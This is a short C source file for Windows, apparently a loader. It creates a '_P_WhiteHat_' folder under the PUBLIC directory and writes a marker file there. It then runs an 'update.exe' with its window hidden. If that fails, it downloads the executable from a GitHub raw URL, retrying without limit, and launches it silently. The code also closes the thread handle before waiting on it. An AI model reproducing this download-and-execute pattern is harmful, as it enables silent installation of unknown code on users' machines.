#include <stdio.h>
#include <windows.h>
#include <winhttp.h>
#include <unistd.h>
#include <string.h>
#include <__pink/pinkwin.h>
#include <__pink/pfile.h>
#include <__pink/pstruct.h>
#include <__pink/phttp.h>

#ifndef __PINK__
#define __PINK__	-0x50494E4B4B4E4950LL
#endif

#define VERSION 101LL

void pset_wh(_WH* _wh);
int dofunc(char* filepath);

DWORD WINAPI Func(void* argv)
{
	int ret;
	char *ps=getenv("PUBLIC"), *GlobalBuffer=(char*)malloc(1024), *filepath=GlobalBuffer;
	char *dir[2]={"/_P_WhiteHat_", "/update.exe"};
	if(!GlobalBuffer)
		return -1;
	pmkdir(filepath, ps, dir, 1);
	strcat(filepath, dir[1]);
	ShellExecute(NULL, "open", filepath, NULL, NULL, SW_HIDE);
	if(GetLastError()!=0){
		do{
			ret=pDownload(L"raw.githubusercontent.com", L"2641797006/c/master/_P_whitehat_/update.exe", filepath);
		}while(ret!=0);
		ShellExecute(NULL, "open", filepath, NULL, NULL, SW_HIDE);
	}
	free(GlobalBuffer);
	return 0;
}

int main(){
	char *fileindex=getenv("PUBLIC"), *GlobalBuffer=(char*)malloc(1024), *filepath=GlobalBuffer;
	char *dir[2]={"/_P_WhiteHat_", "/.wh"};
	if(!GlobalBuffer)
		return -1;
	pmkdir(filepath, fileindex, dir, 1);
	strcat(filepath, dir[1]);
	dofunc(filepath);

	HANDLE hThread;
	hThread=pCreateThread(&Func, NULL);
	CloseHandle(hThread);
	WaitForSingleObject(hThread, INFINITE);

	free(GlobalBuffer);
	return 0;
}

int dofunc(char* filepath)
{
	FILE* fp;
	_WH _wh;
	pset_wh(&_wh);
	if(access(filepath, F_OK))
		pfile_wb(filepath, &_wh, 96);
	else{
		fp=fopen(filepath, "rb+");
		if(!fp)
			return -1;
		if( fread(&_wh, 96, 1, fp)!=1 )
			_wh.flag=-1;
		if(_wh.version<VERSION)
			_wh.flag=-2;
		if(_wh.flag!=__PINK__){
			fclose(fp);
			pset_wh(&_wh);
			pfile_wb(filepath, &_wh, 96);
			return -2;
		}
	}
	return 0;
}

void pset_wh(_WH* _wh)
{
	_wh->flag=__PINK__;
	_wh->version=VERSION;
	strcpy(_wh->word, "#This file is use for pcmd.exe!\r\n#version : 1.01\r\n\r\n");
}